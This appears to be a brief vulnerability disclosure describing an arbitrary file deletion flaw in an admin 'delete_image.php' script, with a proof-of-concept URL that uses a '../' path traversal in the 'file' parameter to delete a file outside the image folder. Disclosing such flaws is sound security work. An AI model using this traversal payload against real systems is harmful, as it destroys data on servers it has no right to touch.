affected executable: 
First, we can create a test file "test.txt" in root directory.

Then, visit the Vulnerable URL: http://xx.xx.com/admin/delete_image.php?file=../test.txt

and the "test.txt" file in the root directory will be deleted.

That is, we can control the "delete_image.php?file=" parameter to delete any file through the relative path
